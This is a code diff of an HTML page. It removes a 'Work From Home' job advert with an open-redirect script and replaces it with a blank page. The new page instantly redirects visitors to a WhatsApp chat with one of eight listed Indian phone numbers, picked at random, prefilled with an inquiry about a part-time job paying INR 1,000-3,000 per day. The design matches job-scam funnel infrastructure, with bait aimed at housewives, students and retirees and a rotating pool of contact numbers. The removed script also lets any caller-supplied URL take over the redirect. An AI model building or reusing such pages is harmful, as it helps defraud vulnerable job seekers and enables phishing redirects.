@@ -1,137 +1,22 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Work From Home - Apply Now</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Inter', sans-serif;
-      background: linear-gradient(to right, #eef2f3, #8e9eab);
-      color: #1f2937;
-    }
-    header {
-      background: #ff4f5a;
-      padding: 3rem 1rem;
-      text-align: center;
-      color: white;
-    }
-    header h1 {
-      font-size: 3rem;
-      font-weight: 800;
-      margin-bottom: 0.5rem;
-    }
-    header p {
-      font-size: 1.2rem;
-      margin: 0;
-    }
-    .container {
-      max-width: 800px;
-      margin: -2rem auto 2rem;
-      background: white;
-      padding: 2rem;
-      border-radius: 1rem;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-    }
-    .banner-img {
-      width: 100%;
-      border-radius: 1rem;
-      margin-bottom: 1.5rem;
-    }
-    h2 {
-      font-size: 1.5rem;
-      color: #ff4f5a;
-      margin-bottom: 1rem;
-    }
-    ul {
-      list-style: none;
-      padding-left: 1rem;
-      margin-bottom: 2rem;
-    }
-    ul li {
-      margin-bottom: 0.75rem;
-      position: relative;
-      padding-left: 1.5rem;
-    }
-    ul li::before {
-      content: '✔';
-      position: absolute;
-      left: 0;
-      color: #00b894;
-      font-weight: bold;
-    }
-    .apply-btn {
-      display: block;
-      width: fit-content;
-      margin: 0 auto;
-      background-color: #00b894;
-      color: #fff;
-      padding: 0.85rem 2rem;
-      border-radius: 50px;
-      font-size: 1.1rem;
-      font-weight: bold;
-      text-decoration: none;
-      text-align: center;
-      box-shadow: 0 4px 15px rgba(0, 184, 148, 0.3);
-    }
-    .apply-btn:hover {
-      background-color: #019875;
-    }
-    .info-section {
-      text-align: center;
-      margin-top: 2rem;
-    }
-    footer {
-      text-align: center;
-      font-size: 0.9rem;
-      color: #555;
-      padding: 2rem 0;
-    }
-  </style>
-</head>
-<body>
-  <header>
-    <h1>WORK FROM HOME</h1>
-    <p>Part-Time / Full-Time Without Disturbing Your Current Work</p>
-  </header>
-
-  <div class="container">
-    <img src="https://cdn.pixabay.com/photo/2015/01/08/18/25/home-office-593327_1280.jpg" alt="Work from home image" class="banner-img" />
-
-    <h2>Suitable For:</h2>
-    <ul>
-      <li>Housewives</li>
-      <li>Students</li>
-      <li>Professionals</li>
-      <li>Retired Individuals</li>
-    </ul>
-
-    <h2>Perks & Benefits:</h2>
-    <ul>
-      <li>Earn Extra Income</li>
-      <li>Work 2-3 Hrs a Day</li>
-      <li>Training and Support Provided</li>
-      <li>No Experience and Qualification Required</li>
-      <li>Anyone Can Apply</li>
-    </ul>
-
-    <div class="info-section">
-      <a href="http://usssa.icu/book" class="apply-btn" id="cta">Apply Now</a>
-    </div>
-  </div>
-
-  <footer>
-   
-  </footer>
-
+  <meta charset="utf-8">
+  <title></title>
   <script>
-    const params = new URLSearchParams(window.location.search);
-    let redirectURL = params.get('url') || 'http://usssa.icu/book';
-    document.getElementById('cta').addEventListener('click', function() {
-      window.location.href = redirectURL;
-    });
+    const nums = [
+      "917001766240",
+      "919306367232",
+      "919366912127",
+      "919128519698",
+      "916000682455",
+      "919850703043",
+      "919236181225",
+      "916309718532"
+    ];
+    const msg = encodeURIComponent("Can you tell me the process of this part-time job which earns INR 1,000-3,000 per day?");
+    const pick = nums[Math.floor(Math.random() * nums.length)];
+    window.location.replace("https://wa.me/" + pick + "?text=" + msg);
   </script>
-</body>
+</head>
 </html>
